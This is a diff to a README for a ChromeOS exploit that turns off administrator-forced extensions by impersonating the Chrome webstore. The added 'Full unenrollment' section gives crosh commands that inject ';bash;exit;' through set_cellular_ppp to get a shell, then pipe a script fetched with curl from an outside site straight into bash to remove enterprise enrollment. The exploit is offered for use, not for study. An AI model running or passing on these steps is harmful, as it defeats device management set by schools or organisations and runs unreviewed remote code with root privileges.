@@ -75,11 +75,13 @@ You're done! The extension should now be enabled.
 
 Credit bypassi for finding and making this exploit!
 
-So... How does it work?
-Well, it's pretty basic. It finds extensions and displays them on this page with some toggle switches
+## How does it work
+Well, it's pretty basic. It finds extensions and displays them on this page with some toggle switches.
+
 ![image](https://yeeteeyt.github.io/exploitbranch.png)
 
 then, it detects when the toggle switch is toggled, and for what extension, then compiles a message to chrome that says "hey, turn this off for me". Chrome, mistaking this for the webstore complies.
+
 ![image](https://yeeteeyt.github.io/exploitgrid.png)
 
 ## v106 and above
@@ -108,3 +110,13 @@ STEPS:
 If anyone knows some fun commands for the bash shell to break things even further, let me know!
 
 Thanks to CoolElectronics for finding this amazing trick, trent:gra.im and justinchrm for helping with some parts, and the discoverer of the original bash shell exploit found here https://bugs.chromium.org/p/chromium/issues/detail?id=1329945
+
+### Full unenrollment
+
+**Note: This only works on version 101!**
+
+Run the following commands in crosh:
+```bash
+set_cellular_ppp \';bash;exit;\'
+bash <(curl https://coolelectronics.me/unenroll101.sh)
+```
